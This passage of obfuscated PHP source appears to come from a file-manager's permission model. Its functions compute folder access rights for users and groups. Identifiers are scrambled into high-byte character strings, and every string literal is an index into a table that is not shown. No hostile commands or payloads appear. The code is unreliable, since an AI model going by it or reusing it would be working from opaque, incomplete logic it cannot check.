($Ó‹µ“ğª as $³â ö¥Ì) { if (!in_array($³â ö¥Ì[$¸Ñëöş«[449]], $ ¿õ°Æ)) { show_json(LNG($¸Ñëöş«[2043]), !1); } if ($êı»ë¸÷ != $¡½­êÛ¸) { if ($³â ö¥Ì[$¸Ñëöş«[449]] == SourceModel::TYPE_GROUP) { } if ($³â ö¥Ì[$¸Ñëöş«[534]] != 0 && !in_array($³â ö¥Ì[$¸Ñëöş«[534]], $ãÁíÃ€Á)) { } } if ($³â ö¥Ì[$¸Ñëöş«[534]] == 0) { $³â ö¥Ì[$¸Ñëöş«[449]] = SourceModel::TYPE_USER; } $üİº‘Üö[] = array($¸Ñëöş«[440] => $ßÖÚÊİ, $¸Ñëöş«[449] => intval($³â ö¥Ì[$¸Ñëöş«[449]]), $¸Ñëöş«[534] => intval($³â ö¥Ì[$¸Ñëöş«[534]]), $¸Ñëöş«[1965] => intval($³â ö¥Ì[$¸Ñëöş«[1965]]) ? intval($³â ö¥Ì[$¸Ñëöş«[1965]]) : 0, $¸Ñëöş«[2025] => intval($³â ö¥Ì[$¸Ñëöş«[2025]]) ? intval($³â ö¥Ì[$¸Ñëöş«[2025]]) : -1); } $this->where(array($¸Ñëöş«[455] => $ßÖÚÊİ))->delete(); $this->addAll($üİº‘Üö); return !0; } public function authClear($›¥‡øş) { $§·ô¶–Ç =& $_SERVER[”ú…±Ú¥]; $­©ØˆÀ = Model($§·ô¶–Ç[1362])->sourceInfo($›¥‡øş); $ˆÉÏ¤óŞ = array($›¥‡øş); if ($­©ØˆÀ[$§·ô¶–Ç[448]] == $§·ô¶–Ç[88]) { $ëü’ÛöÙ = array($§·ô¶–Ç[618] => array($§·ô¶–Ç[578], $­©ØˆÀ[$§·ô¶–Ç[549]] . $›¥‡øş . $§·ô¶–Ç[579])); $ˆÉÏ¤óŞ = Model($§·ô¶–Ç[1362])->field($§·ô¶–Ç[455])->where($ëü’ÛöÙ)->getField($§·ô¶–Ç[440], !0); $ˆÉÏ¤óŞ[] = $›¥‡øş; } $this->where(array($§·ô¶–Ç[455] => array($§·ô¶–Ç[456], $ˆÉÏ¤óŞ)))->delete(); return !0; } public function getAllChildren($¶ÄÅÜğ) { $ƒ¡À¿³¥ =& $_SERVER[”ú…±Ú¥]; $óÃÜä‡§ = Model($ƒ¡À¿³¥[1362])->sourceInfo($¶ÄÅÜğ); if ($óÃÜä‡§[$ƒ¡À¿³¥[448]] != $ƒ¡À¿³¥[88]) { return $this->sourceListAuth(array($¶ÄÅÜğ)); } if ($óÃÜä‡§[$ƒ¡À¿³¥[449]] != SourceModel::TYPE_GROUP) { return array(); } $Şéì÷Ì¡ = 1; $¬ÕŠÂÎ” = array($¶ÄÅÜğ); if ($óÃÜä‡§[$ƒ¡À¿³¥[470]] == $ƒ¡À¿³¥[208] && $óÃÜä‡§[$ƒ¡À¿³¥[534]] != $Şéì÷Ì¡) { $¬ÕŠÂÎ” = $this->groupChidldAllRootSource($óÃÜä‡§[$ƒ¡À¿³¥[534]]); } $ğ¼Òùƒ = $this->field($ƒ¡À¿³¥[440])->group($ƒ¡À¿³¥[440])->select(); $ğ¼Òùƒ = array_to_keyvalue($ğ¼Òùƒ, $ƒ¡À¿³¥[12], $ƒ¡À¿³¥[440]); if (!$ğ¼Òùƒ) { return array(); } $‘ûÏÎ’± = $ƒ¡À¿³¥[2044]; $É÷„‰İ› = array($ƒ¡À¿³¥[440] => array($ƒ¡À¿³¥[7], $ğ¼Òùƒ), $ƒ¡À¿³¥[469] => $ƒ¡À¿³¥[208]); $¡ı ÍÉ® = Model($ƒ¡À¿³¥[857])->field($‘ûÏÎ’±)->where($É÷„‰İ›)->select(); $Ñ€šØÖ± = array($¶ÄÅÜğ); foreach ($¡ı ÍÉ® as $ì¥©ôøÇ) { foreach ($¬ÕŠÂÎ” as $Ÿ¼¤Ç¥) { $—ÒñÆ“Ä = $ƒ¡À¿³¥[50] . $Ÿ¼¤Ç¥ . $ƒ¡À¿³¥[50]; $ÒşºìüÂ = $ì¥©ôøÇ[$ƒ¡À¿³¥[549]] . $ì¥©ôøÇ[$ƒ¡À¿³¥[440]] . $ƒ¡À¿³¥[50]; if (strstr($ÒşºìüÂ, $—ÒñÆ“Ä)) { $Ñ€šØÖ±[] = $ì¥©ôøÇ[$ƒ¡À¿³¥[440]]; break; } } } return $this->sourceListAuth($Ñ€šØÖ±); } private function sourceListAuth($¥Å…ã) { $Úòæ®€ë =& $_SERVER[”ú…±Ú¥]; $òª®üÙø = Model($Úòæ®€ë[1362])->sourceListInfo($¥Å…ã, !0); $Ê¨°ù•Î = $this->sourceAuthSelect($¥Å…ã); $¼ê™™âÑ = array(); $ª³ß¾é‰ = array(); foreach ($òª®üÙø as $ÒìÊà’) { unset($ÒìÊà’[$Úòæ®€ë[494]]); unset($ÒìÊà’[$Úòæ®€ë[492]]); unset($ÒìÊà’[$Úòæ®€ë[451]]); unset($ÒìÊà’[$Úòæ®€ë[87]]); $°ÛË¶ëà = $Ê¨°ù•Î[$ÒìÊà’[$Úòæ®€ë[440]]]; if (!$°ÛË¶ëà) { continue; } $ÒìÊà’[$Úòæ®€ë[2045]] = $this->authTargetInfo($°ÛË¶ëà); $ÒìÊà’[$Úòæ®€ë[547]] = rtrim($ÒìÊà’[$Úòæ®€ë[553]], $Úòæ®€ë[8]) . $Úòæ®€ë[8] . ltrim($ÒìÊà’[$Úòæ®€ë[547]], $Úòæ®€ë[8]); $¼ê™™âÑ[] = $ÒìÊà’; $ À‰Ê¯Å = count(explode($Úòæ®€ë[8], trim($ÒìÊà’[$Úòæ®€ë[547]], $Úòæ®€ë[8]))); $ª³ß¾é‰[] = $ À‰Ê¯Å + ($ÒìÊà’[$Úòæ®€ë[33]] == $Úòæ®€ë[75] ? 0 : 1000); } array_multisort($ª³ß¾é‰, SORT_ASC, $¼ê™™âÑ); return $¼ê™™âÑ; } private function groupChidldAllRootSource($÷ì°Ùò‰) { $İÓ½ØÜÀ =& $_SERVER[”ú…±Ú¥]; $šâí¢ƒ× = Model($İÓ½ØÜÀ[2046])->groupChildrenAll($÷ì°Ùò‰); $ÂêáÔ¥Ã = array($İÓ½ØÜÀ[470] => 0, $İÓ½ØÜÀ[534] => array($İÓ½ØÜÀ[7], $šâí¢ƒ×), $İÓ½ØÜÀ[449] => SourceModel::TYPE_GROUP); $ó“â¸Á = Model($İÓ½ØÜÀ[857])->field($İÓ½ØÜÀ[440])->where($ÂêáÔ¥Ã)->select(); $ó“â¸Á = array_to_keyvalue($ó“â¸Á, $İÓ½ØÜÀ[12], $İÓ½ØÜÀ[440]); return $ó“â¸Á; } private function authTargetInfo($àÇÛ¦œ«) { $ö¼™å¼£ =& $_SERVER[”ú…±Ú¥]; $üœ»ãÜØ = array(); $«ƒÁ‘ÙÁ = array(); $˜ÔÑ¨—² = 2 << 25; foreach ($àÇÛ¦œ« as $â‹ŞÏÒ) { $¯Ÿ•‰£ = Model($ö¼™å¼£[536])->listData($â‹ŞÏÒ[$ö¼™å¼£[1965]]); if (!$¯Ÿ•‰£) { continue; } if ($â‹ŞÏÒ[$ö¼™å¼£[449]] == SourceModel::TYPE_USER) { $Í›Ú‘–İ = Model($ö¼™å¼£[542])->getInfoSimpleOuter($â‹ŞÏÒ[$ö¼™å¼£[534]]); if ($Í›Ú‘–İ[$ö¼™å¼£[1671]] == $ö¼™å¼£[1217]) { continue; } if ($Í›Ú‘–İ[$ö¼™å¼£[1671]] == $ö¼™å¼£[208]) { $Í›Ú‘–İ[$ö¼™å¼£[32]] = LNG($ö¼™å¼£[2047]); } } else { $Í›Ú‘–İ = Model($ö¼™å¼£[550])->getInfoSimple($â‹ŞÏÒ[$ö¼™å¼£[534]]); } if (!$Í›Ú‘–İ) { continue; } $Í›Ú‘–İ[$ö¼™å¼£[505]] = $¯Ÿ•‰£; $üœ»ãÜØ[] = $Í›Ú‘–İ; $ºâÂ¡ğ¤ = 0; if ($â‹ŞÏÒ[$ö¼™å¼£[449]] == SourceModel::TYPE_GROUP) { $ºâÂ¡ğ¤ = $˜ÔÑ¨—² * 2; } if ($â‹ŞÏÒ[$ö¼™å¼£[449]] == SourceModel::TYPE_USER) { $ºâÂ¡ğ¤ = $˜ÔÑ¨—²; } if ($â‹ŞÏÒ[$ö¼™å¼£[449]] == SourceModel::TYPE_USER && $â‹ŞÏÒ[$ö¼™å¼£[534]] == $ö¼™å¼£[208]) { $ºâÂ¡ğ¤ = 0; } $«ƒÁ‘ÙÁ[] = $¯Ÿ•‰£[$ö¼™å¼£[451]] + $ºâÂ¡ğ¤; } array_multisort($«ƒÁ‘ÙÁ, SORT_DESC, $üœ»ãÜØ); return $üœ»ãÜØ; } public function getAllChildrenByUser($Á´ÓÄÙ×, $ı‡¡ÖÈŒ) { $ˆìƒ¾òß =& $_SERVER[”ú…±Ú¥]; $•É â¥¼ = Model($ˆìƒ¾òß[563])->getInfo($ı‡¡ÖÈŒ); if (!$ı‡¡ÖÈŒ || !$Á´ÓÄÙ× || !$•É â¥¼) { return array(); } $üÏí±ÄÒ = Model($ˆìƒ¾òß[1362])->sourceInfo($Á´ÓÄÙ×); $‘€¡Â„Â = array(); $ÁêÔó“” = 1; if ($üÏí±ÄÒ[$ˆìƒ¾òß[470]] == $ˆìƒ¾òß[208] && $üÏí±ÄÒ[$ˆìƒ¾òß[534]] != $ÁêÔó“” && $this->groupContainUser($üÏí±ÄÒ[$ˆìƒ¾òß[534]], $ı‡¡ÖÈŒ)) { foreach ($•É â¥¼[$ˆìƒ¾òß[2048]] as $°ªï¢ÖÃ) { $™®ÔÑáœ = Model($ˆìƒ¾òß[550])->getInfo($°ªï¢ÖÃ[$ˆìƒ¾òß[1861]]); $œ€ôœô = Model($ˆìƒ¾òß[563])->getInfoSimpleOuter($ı‡¡ÖÈŒ); $œ€ôœô[$ˆìƒ¾òß[505]] = $°ªï¢ÖÃ[$ˆìƒ¾òß[451]]; if (Model($ˆìƒ¾òß[536])->authCheckAction($°ªï¢ÖÃ[$ˆìƒ¾òß[451]][$ˆìƒ¾òß[451]], $ˆìƒ¾òß[1882])) { continue; } $¼âä™•œ = array($ˆìƒ¾òß[32] => $ˆìƒ¾òß[1237] . $™®ÔÑáœ[$ˆìƒ¾òß[32]], $ˆìƒ¾òß[440] => $™®ÔÑáœ[$ˆìƒ¾òß[87]][$ˆìƒ¾òß[440]], $ˆìƒ¾òß[84] => KodIO::make($™®ÔÑáœ[$ˆìƒ¾òß[87]][$ˆìƒ¾òß[440]]), $ˆìƒ¾òß[470] => $ˆìƒ¾òß[208], $ˆìƒ¾òß[449] => $ˆìƒ¾òß[543], $ˆìƒ¾òß[33] => $ˆìƒ¾òß[582], $ˆìƒ¾òß[547] => $™®ÔÑáœ[$ˆìƒ¾òß[554]], $ˆìƒ¾òß[1861] => $™®ÔÑáœ[$ˆìƒ¾òß[1861]], $ˆìƒ¾òß[551] => $™®ÔÑáœ[$ˆìƒ¾òß[470]], $ˆìƒ¾òß[2045] => array($œ€ôœô)); $‘€¡Â„Â[$¼âä™•œ[$ˆìƒ¾òß[440]]] = $¼âä™•œ; } } $¯î¥å²ê = array(); $‘Î‚ÉÙº = $this->getAllChildren($Á´ÓÄÙ×); foreach ($‘Î‚ÉÙº as $šÆóš³ˆ) { $…Ö†˜¿Õ = !1; foreach ($šÆóš³ˆ[$ˆìƒ¾òß[2045]] as $™ËÒØïƒ) { if ($™ËÒØïƒ[$ˆìƒ¾òß[1671]]) { if ($™ËÒØïƒ[$ˆìƒ¾òß[1671]] == $ı‡¡ÖÈŒ) { $…Ö†˜¿Õ = !0; break; } } if ($™ËÒØïƒ[$ˆìƒ¾òß[1861]]) { if ($this->groupContainUser($™ËÒØïƒ[$ˆìƒ¾òß[1861]], $ı‡¡ÖÈŒ)) { $…Ö†˜¿Õ = !0; break; } } } if ($…Ö†˜¿Õ) { $¯î¥å²ê[] = $šÆóš³ˆ; } $©‹ê¯¥‚ = $šÆóš³ˆ[$ˆìƒ¾òß[440]]; if (isset($‘€¡Â„Â[$©‹ê¯¥‚])) { $šÆóš³ˆ[$ˆìƒ¾òß[2045]][] = $‘€¡Â„Â[$©‹ê¯¥‚][0]; $‘€¡Â„Â[$©‹ê¯¥‚] = !1; } } $‘€¡Â„Â = array_filter(array_values($‘€¡Â„Â)); $¯î¥å²ê = array_merge($‘€¡Â„Â, $¯î¥å²ê); return $¯î¥å²ê; } public function setAllChildrenByUser($Ğ‰ê‹ÓÏ, $°•”ÍĞ, $¶ Á£§ú) { $¾ÎØ¶’¸ =& $_SERVER[”ú…±Ú¥]; $§¸±ûÃ = $this->getAllChildrenByUser($Ğ‰ê‹ÓÏ, $°•”ÍĞ); if (!$¶ Á£§ú || !$§¸±ûÃ) { return !1; } foreach ($§¸±ûÃ as $Î”ŒÙıô) { $õŠÅÜ× = array(); foreach ($Î”ŒÙıô[$¾ÎØ¶’¸[2045]] as $ƒèòÈ¨¯) { $î×ëÈ»­ = $ƒèòÈ¨¯[$¾ÎØ¶’¸[505]]; $øÜ¤ù‘¦ = $ƒèòÈ¨¯[$¾ÎØ¶’¸[1671]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ßŠœšĞê = $ƒèòÈ¨¯[$¾ÎØ¶’¸[1671]] ? $ƒèòÈ¨¯[$¾ÎØ¶’¸[1671]] : $ƒèòÈ¨¯[$¾ÎØ¶’¸[1861]]; if ($ƒèòÈ¨¯[$¾ÎØ¶’¸[1671]] && $ƒèòÈ¨¯[$¾ÎØ¶’¸[1671]] == $°•”ÍĞ) { continue; } $õŠÅÜ×[] = array($¾ÎØ¶’¸[440] => $Î”ŒÙıô[$¾ÎØ¶’¸[440]], $¾ÎØ¶’¸[449] => $øÜ¤ù‘¦, $¾ÎØ¶’¸[534] => intval($ßŠœšĞê), $¾ÎØ¶’¸[1965] => isset($î×ëÈ»­[$¾ÎØ¶’¸[437]]) ? intval($î×ëÈ»­[$¾ÎØ¶’¸[437]]) : 0, $¾ÎØ¶’¸[2025] => isset($î×ëÈ»­[$¾ÎØ¶’¸[2025]]) ? intval($î×ëÈ»­[$¾ÎØ¶’¸[2025]]) : -1); } $õŠÅÜ×[] = array($¾ÎØ¶’¸[440] => $Î”ŒÙıô[$¾ÎØ¶’¸[440]], $¾ÎØ¶’¸[449] => SourceModel::TYPE_USER, $¾ÎØ¶’¸[534] => intval($°•”ÍĞ), $¾ÎØ¶’¸[1965] => intval($¶ Á£§ú), $¾ÎØ¶’¸[2025] => -1); $this->where(array($¾ÎØ¶’¸[455] => $Î”ŒÙıô[$¾ÎØ¶’¸[440]]))->delete(); $this->addAll($õŠÅÜ×); } return !0; } public function get($Š—Û¨½) { $²ÅÚ¶ = $this->getSourceList(array($Š—Û¨½), !0); return $²ÅÚ¶[0]; } public function getSourceList($ÙàÇ÷¾¬, $¡¯ïÃÜ = false, $ßú¢¿¾• = false) { $µ¼†ÀÑ˜ =& $_SERVER[”ú…±Ú¥]; if (!$ÙàÇ÷¾¬) { return array(); } $¶õ¨ÕÔ… = Model($µ¼†ÀÑ˜[1362]); if (!$¡¯ïÃÜ && count($ÙàÇ÷¾¬) == 1) { $¡¯ïÃÜ = array(); $¡¯ïÃÜ[$ÙàÇ÷¾¬[0]] = $¶õ¨ÕÔ…->sourceInfo($ÙàÇ÷¾¬[0]); } if (!$¡¯ïÃÜ) { $å¥ë¯ëè = array($µ¼†ÀÑ˜[455] => array($µ¼†ÀÑ˜[456], $ÙàÇ÷¾¬)); $¡¯ïÃÜ = $¶õ¨ÕÔ…->field($µ¼†ÀÑ˜[2049])->where($å¥ë¯ëè)->select(); $¡¯ïÃÜ = array_to_keyvalue($¡¯ïÃÜ, $µ¼†ÀÑ˜[440]); } $ñˆû®ºò = $ÙàÇ÷¾¬; foreach ($¡¯ïÃÜ as $¢¢¾ÎœÃ => $–£ˆŠÌ) { $µ¥¸îÏ° = $¶õ¨ÕÔ…->parentLevelArray($–£ˆŠÌ[$µ¼†ÀÑ˜[549]]); $ñˆû®ºò = array_merge($ñˆû®ºò, array($¢¢¾ÎœÃ), array_reverse($µ¥¸îÏ°)); } $ñˆû®ºò = array_values(array_unique($ñˆû®ºò)); if (!$ñˆû®ºò) { return array(); } $Ú¶À‰°Ä = $this->sourceAuthSelect($ñˆû®ºò); $İ‹õêÉ = array(); foreach ($ñˆû®ºò as $¦€›Û¢“) { if (isset($Ú¶À‰°Ä[$¦€›Û¢“])) { $İ‹õêÉ[$¦€›Û¢“] = $Ú¶À‰°Ä[$¦€›Û¢“]; } } $“ë¾Ò«Î = $this->userIsRoot($ßú¢¿¾•); $ÉŠúğúœ = AuthModel::authAll(); $´‹•é» = array($µ¼†ÀÑ˜[452] => $ÉŠúğúœ, $µ¼†ÀÑ˜[2050] => array($µ¼†ÀÑ˜[457] => 0, $µ¼†ÀÑ˜[1867] => $ÉŠúğúœ, $µ¼†ÀÑ˜[458] => LNG($µ¼†ÀÑ˜[2051]), $µ¼†ÀÑ˜[1884] => $µ¼†ÀÑ˜[2052])); $ãêÆ¹† = array(); foreach ($¡¯ïÃÜ as $¦€›Û¢“ => $ Ÿ…£»É) { if ($“ë¾Ò«Î && $GLOBALS[$µ¼†ÀÑ˜[6]][$µ¼†ÀÑ˜[1880]]) { $ãêÆ¹†[$¦€›Û¢“] = $´‹•é»; continue; } $ãêÆ¹†[$¦€›Û¢“] = $this->makeSourceAuth($ Ÿ…£»É, $İ‹õêÉ, $ßú¢¿¾•); } return $ãêÆ¹†; } public function authDeepCheck($¦ì­Ûõ, $±–±±‘ğ = false) { $Ÿª©Ü¹ş =& $_SERVER[”ú…±Ú¥]; $±–±±‘ğ = $±–±±‘ğ ? $±–±±‘ğ : USER_ID; $€Õ£´ò = $this->makeAuthDeep($±–±±‘ğ); if (!in_array($¦ì­Ûõ, $€Õ£´ò[$Ÿª©Ü¹ş[2053]])) { return !1; } $è™Ó ‚° = array(); foreach ($€Õ£´ò[$Ÿª©Ü¹ş[2054]] as $Ú‰¡Ôºà => $öŸƒçÊê) { if (!in_array($¦ì­Ûõ, $öŸƒçÊê)) { continue; } $è™Ó ‚°[] = $Ú‰¡Ôºà; } if (!$è™Ó ‚°) { return !1; } $¼óì´êç = $è™Ó ‚° ? $è™Ó ‚°[0] : $¦ì­Ûõ; return array($Ÿª©Ü¹ş[452] => -1, $Ÿª©Ü¹ş[505] => array($Ÿª©Ü¹ş[457] => $Ÿª©Ü¹ş[1217], $Ÿª©Ü¹ş[1867] => $Ÿª©Ü¹ş[208], $Ÿª©Ü¹ş[458] => LNG($Ÿª©Ü¹ş[2055]), $Ÿª©Ü¹ş[1884] => $Ÿª©Ü¹ş[2056]), $Ÿª©Ü¹ş[2057] => LNG($Ÿª©Ü¹ş[2058]), $Ÿª©Ü¹ş[2059] => $this->sourceAuthInfo($¼óì´êç)); } protected function makeAuthDeep($ŒÌ£åÛ = false) { $—­ŒØÇÕ =& $_SERVER[”ú…±Ú¥]; static $àóŞ‚š = array(); $ŒÌ£åÛ = $ŒÌ£åÛ ? $ŒÌ£åÛ : USER_ID; if (isset($àóŞ‚š[$ŒÌ£åÛ])) { return $àóŞ‚š[$ŒÌ£åÛ]; } $Ëúèœ = Model($—­ŒØÇÕ[2060])->listData(); $¿•ÄÀŸ = array(); foreach ($Ëúèœ as $ûó×ÄşÛ) { if ($ûó×ÄşÛ[$—­ŒØÇÕ[451]] == 0 && $ûó×ÄşÛ[$—­ŒØÇÕ[1883]] == $—­ŒØÇÕ[88]) { $¿•ÄÀŸ[] = $ûó×ÄşÛ[$—­ŒØÇÕ[437]]; } } $©¢ñØˆã = $this->userGroupParents($ŒÌ£åÛ); $ôü¤±Êø = array($—­ŒØÇÕ[449] => SourceModel::TYPE_USER, $—­ŒØÇÕ[534] => $ŒÌ£åÛ); if ($©¢ñØˆã) { $ôü¤±Êø = array(array($—­ŒØÇÕ[449] => SourceModel::TYPE_USER, $—­ŒØÇÕ[534] => $ŒÌ£åÛ), array($—­ŒØÇÕ[449] => SourceModel::TYPE_GROUP, $—­ŒØÇÕ[534] => array($—­ŒØÇÕ[456], $©¢ñØˆã)), $—­ŒØÇÕ[1029] => $—­ŒØÇÕ[1959]); } $ò·ã„ = $this->field($—­ŒØÇÕ[2061])->where($ôü¤±Êø)->select(); $ºß¸÷ıİ = array(); $¨«ÉÅ» = array_to_keyvalue_group($ò·ã„, $—­ŒØÇÕ[440]); foreach ($¨«ÉÅ» as $ê¬ââíå => $Úê²€şÂ) { $«î»Šï• = $this->authArrayCheck($Úê²€şÂ, $ŒÌ£åÛ); if ($«î»Šï•[$—­ŒØÇÕ[452]] > 0) { $ºß¸÷ıİ[] = $ê¬ââíå . $—­ŒØÇÕ[12]; } } if ($©¢ñØˆã) { $‡÷Æ„†ß = Model($—­ŒØÇÕ[550]); foreach ($©¢ñØˆã as $Ã”™£æ‹) { $ø¹—Ö È = $‡÷Æ„†ß->getInfo($Ã”™£æ‹); if (!$ø¹—Ö È || !is_array($ø¹—Ö È[$—­ŒØÇÕ[87]])) { continue; } $ºß¸÷ıİ[] = $ø¹—Ö È[$—­ŒØÇÕ[87]][$—­ŒØÇÕ[440]]; } } $í…‡Ì™¥ = array(); $¨Î›·° = $©¢ñØˆã; $æŸ›„Èè = Model($—­ŒØÇÕ[1362]); $‡÷Æ„†ß = Model($—­ŒØÇÕ[550]); $€¹……Œù = array(); $àè¸àßĞ = array(); $ì³î¡¸¶ = array(); $ÇşŠò§ = array(); if ($ºß¸÷ıİ) { $Æ‡ÃâÊ¢ = $æŸ›„Èè->where(array($—­ŒØÇÕ[440] => array($—­ŒØÇÕ[456], $ºß¸÷ıİ)))->select(); foreach ($Æ‡ÃâÊ¢ as $›Î¯êé¢) { $½®Øœëò = $æŸ›„Èè->parentLevelArray($›Î¯êé¢[$—­ŒØÇÕ[549]]); $í…‡Ì™¥ = array_merge($í…‡Ì™¥, $½®Øœëò); $¨Î›·°[] = $›Î¯êé¢[$—­ŒØÇÕ[534]]; $€¹……Œù[$›Î¯êé¢[$—­ŒØÇÕ[440]]] = $½®Øœëò; $àè¸àßĞ[$›Î¯êé¢[$—­ŒØÇÕ[440]]] = $›Î¯êé¢[$—­ŒØÇÕ[534]]; } } $¨Î›·° = array_values(array_unique($¨Î›·°)); $ƒĞ§ñ¾² = $¨Î›·°; foreach ($ƒĞ§ñ¾² as $Ã”™£æ‹) { $ø¹—Ö È = $‡÷Æ„†ß->getInfo($Ã”™£æ‹); $½®Øœëò = $æŸ›„Èè->parentLevelArray($ø¹—Ö È[$—­ŒØÇÕ[549]]); $¨Î›·° = array_merge($¨Î›·°, $½®Øœëò); } $¨Î›·° = array_values(array_unique($¨Î›·°)); foreach ($¨Î›·° as $Ã”™£æ‹) { $ø¹—Ö È = $‡÷Æ„†ß->getInfo($Ã”™£æ‹); $í…‡Ì™¥[] = $ø¹—Ö È[$—­ŒØÇÕ[87]][$—­ŒØÇÕ[440]]; $ì³î¡¸¶[$Ã”™£æ‹] = $ø¹—Ö È[$—­ŒØÇÕ[87]][$—­ŒØÇÕ[440]]; $ÇşŠò§[$Ã”™£æ‹] = $æŸ›„Èè->parentLevelArray($ø¹—Ö È[$—­ŒØÇÕ[549]]); } foreach ($€¹……Œù as $…ÖÁä„ => $ì³¤êĞÀ) { $õÌÌàı“ = $àè¸àßĞ[$…ÖÁä„]; if (!$õÌÌàı“ || !$ì³î¡¸¶[$õÌÌàı“]) { continue; } $ÅüÏ•«ô = array(); foreach ($ÇşŠò§[$õÌÌàı“] as $Ã”™£æ‹) { $ÅüÏ•«ô[] = $ì³î¡¸¶[$Ã”™£æ‹]; } $€¹……Œù[$…ÖÁä„] = array_merge($ÅüÏ•«ô, $ì³¤êĞÀ); } $í…‡Ì™¥ = array_values(array_unique($í…‡Ì™¥)); $ŠÎ¥ß¥ş = array($—­ŒØÇÕ[2053] => $í…‡Ì™¥, $—­ŒØÇÕ[2054] => $€¹……Œù); $àóŞ‚š[$ŒÌ£åÛ] = $ŠÎ¥ß¥ş; return $ŠÎ¥ß¥ş; } private function makeSourceAuth($óú’Ãß, $à÷ş’, $§Ü®Œïé = false) { $ı¿Û¿‰ß =& $_SERVER[”ú…±Ú¥]; $æ²çÔ¥ = $ı¿Û¿‰ß[88]; $á¨ÏÔÙ = $óú’Ãß[$ı¿Û¿‰ß[534]]; $£¼˜òì = $óú’Ãß[$ı¿Û¿‰ß[449]] == SourceModel::TYPE_GROUP; $€ƒü°»Ø = $£¼˜òì ? $this->groupRootAuth($á¨ÏÔÙ, $§Ü®Œïé) : !1; if ($€ƒü°»Ø && Model($ı¿Û¿‰ß[536])->authCheckAction($€ƒü°»Ø[$ı¿Û¿‰ß[451]], $ı¿Û¿‰ß[1882])) { return $this->groupAuthInfo($€ƒü°»Ø, $á¨ÏÔÙ); } $íÂ¨çÈÏ = Model($ı¿Û¿‰ß[1362])->parentLevelArray($óú’Ãß[$ı¿Û¿‰ß[549]]); $íÂ¨çÈÏ = array_merge(array($óú’Ãß[$ı¿Û¿‰ß[440]]), array_reverse($íÂ¨çÈÏ)); $îÎÜÍ« = !1; foreach ($íÂ¨çÈÏ as $†½Î¡íÜ) { if (!isset($à÷ş’[$†½Î¡íÜ])) { continue; } $¢¬é¡“â = $this->authMake($à÷ş’[$†½Î¡íÜ], $§Ü®Œïé); if ($¢¬é¡“â[$ı¿Û¿‰ß[505]]) { $îÎÜÍ« = $¢¬é¡“â; break; } } if (!$£¼˜òì) { return $îÎÜÍ«; } if (!$îÎÜÍ« && $€ƒü°»Ø) { $îÎÜÍ« = $this->groupAuthInfo($€ƒü°»Ø, $á¨ÏÔÙ); } if (!$îÎÜÍ«) { $Æí®œ€’ = Model($ı¿Û¿‰ß[550])->getInfo($á¨ÏÔÙ); $˜Ì§Ü²´ = explode($ı¿Û¿‰ß[50], trim($Æí®œ€’[$ı¿Û¿‰ß[549]], $ı¿Û¿‰ß[50])); $˜Ì§Ü²´ = array_reverse($˜Ì§Ü²´); foreach ($˜Ì§Ü²´ as $ˆÌ…Ù‘¯) { if ($ˆÌ…Ù‘¯ == $ı¿Û¿‰ß[208] || $ˆÌ…Ù‘¯ == $æ²çÔ¥) { continue; } $Ä®£°ª = $this->groupRootAuth($ˆÌ…Ù‘¯, $§Ü®Œïé); if (!$Ä®£°ª) { continue; } $îÎÜÍ« = $this->groupAuthInfo($Ä®£°ª, $ˆÌ…Ù‘¯); break; } } if (!$îÎÜÍ« || $îÎÜÍ«[$ı¿Û¿‰ß[452]] <= 0) { $æõ”±Ú‹ = $this->authDeepCheck($óú’Ãß[$ı¿Û¿‰ß[440]], $§Ü®Œïé); if ($æõ”±Ú‹) { $îÎÜÍ« = $æõ”±Ú‹; } } return $îÎÜÍ«; } private function userIsRoot($–ÑšÏ¦¾ = false) { $¹ã¢ÖÒ¥ =& $_SERVER[”ú…±Ú¥]; if (!$–ÑšÏ¦¾ && _get($GLOBALS, $¹ã¢ÖÒ¥[532])) { return !0; } $ºşî¿Ü  = Model($¹ã¢ÖÒ¥[563])->getInfo($–ÑšÏ¦¾); $¨Ãş“ø¸ = Model($¹ã¢ÖÒ¥[2062])->listData($ºşî¿Ü [$¹ã¢ÖÒ¥[1552]]); if ($¨Ãş“ø¸ && $¨Ãş“ø¸[$¹ã¢ÖÒ¥[540]][$¹ã¢ÖÒ¥[2063]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ì–ÔÙÌ¹) { $õ¬÷ö€ =& $_SERVER[”ú…±Ú¥]; $ÅºŠ¶á = Model($õ¬÷ö€[1362]); $ÛÌÖÅ´Ò = $ÅºŠ¶á->sourceInfo($Ì–ÔÙÌ¹); if (!$ÛÌÖÅ´Ò) { return !1; } $ÅºŠ¶á->groupPathDisplay($ÛÌÖÅ´Ò); $ë¼Åàè¨ = array($ÛÌÖÅ´Ò); $ë¼Åàè¨ = $ÅºŠ¶á->_listAppendPath($ë¼Åàè¨); $ÛÌÖÅ´Ò = $ë¼Åàè¨[0]; $­•ì´òè = $ÛÌÖÅ´Ò[$õ¬÷ö€[547]]; if (isset($ÛÌÖÅ´Ò[$õ¬÷ö€[555]])) { $æóâ«É = explode($õ¬÷ö€[8], trim($ÛÌÖÅ´Ò[$õ¬÷ö€[547]], $õ¬÷ö€[8])); array_shift($æóâ«É); $­•ì´òè = $ÛÌÖÅ´Ò[$õ¬÷ö€[553]] . $õ¬÷ö€[2064] . implode($õ¬÷ö€[8], $æóâ«É); } return array($õ¬÷ö€[458] => $ÛÌÖÅ´Ò[$õ¬÷ö€[32]], $õ¬÷ö€[84] => KodIO::make($ÛÌÖÅ´Ò[$õ¬÷ö€[440]]), $õ¬÷ö€[2065] => $­•ì´òè); } private function groupAuthInfo($ÊºÀÑ€, $ªƒäÆÌ°) { $ƒùĞíõˆ =& $_SERVER[”ú…±Ú¥]; $½ú’’‡ = Model($ƒùĞíõˆ[550])->getInfo($ªƒäÆÌ°); return array($ƒùĞíõˆ[2066] => intval($ÊºÀÑ€[$ƒùĞíõˆ[451]]), $ƒùĞíõˆ[2050] => $ÊºÀÑ€, $ƒùĞíõˆ[2067] => LNG($ƒùĞíõˆ[2068]), $ƒùĞíõˆ[2059] => array($ƒùĞíõˆ[458] => $½ú’’‡[$ƒùĞíõˆ[32]], $ƒùĞíõˆ[84] => KodIO::make($½ú’’‡[$ƒùĞíõˆ[87]][$ƒùĞíõˆ[440]]), $ƒùĞíõˆ[2065] => $½ú’’‡[$ƒùĞíõˆ[554]])); } protected function groupRootAuth($ÕÑÒîÏÇ, $ĞœøìäŒ = false) { $¿ô­¬¬Ó =& $_SERVER[”ú…±Ú¥]; $ĞœøìäŒ = $ĞœøìäŒ ? $ĞœøìäŒ : USER_ID; $«üïî„Ü = 